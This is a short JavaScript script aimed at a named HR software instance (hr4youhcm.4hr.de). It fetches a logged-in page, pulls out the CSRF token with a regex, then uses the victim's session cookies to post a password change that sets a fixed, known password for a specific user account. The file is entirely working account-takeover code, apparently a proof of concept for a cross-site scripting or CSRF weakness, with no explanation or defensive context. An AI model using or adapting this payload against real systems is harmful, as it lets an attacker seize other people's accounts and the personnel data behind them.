// Define the new password to set
const newPassword = "NewP@ssw0rd1234";

// URLs for fetching the token and changing the password
const fetchTokenUrl = "https://hr4youhcm.4hr.de/subadmin/login-data";
const changePasswordUrl = "https://hr4youhcm.4hr.de/subadmin/tab/login-data";

// Fetch the page where the token is present
fetch(fetchTokenUrl, { credentials: "include" })
    .then(response => {
        if (!response.ok) throw new Error(`Token fetch failed with status ${response.status}`);
        return response.text(); // Get the HTML as text
    })
    .then(html => {
        // Extract the CSRF token from the response (update the regex as needed)
        const tokenMatch = /<input[^>]*name="_token"[^>]*value="([a-f0-9]+)"/i.exec(html);
        const token = tokenMatch ? tokenMatch[1] : null;

        if (token) {
            console.log("Token extracted:", token);

            // Use the extracted token to perform the password change
            return fetch(changePasswordUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                },
                body: `_token=${token}&_form=loginDataForm&userId=30&userName=referent1&password=${encodeURIComponent(newPassword)}&password2=${encodeURIComponent(newPassword)}&email=referent1%40hr4youhcm.4hr.de&start=17&defaultProjectApplicantView=0&notifier=5000&xing=&linkedIn=`,
                credentials: "include", // Include cookies for session authentication
            });
        } else {
            throw new Error("CSRF token could not be extracted.");
        }
    })
    .then(response => {
        if (response.ok) {
            console.log("Password successfully changed.");
        } else {
            console.error(`Failed to change the password. Status: ${response.status}`);
        }
    })
    .catch(error => console.error("Error:", error));
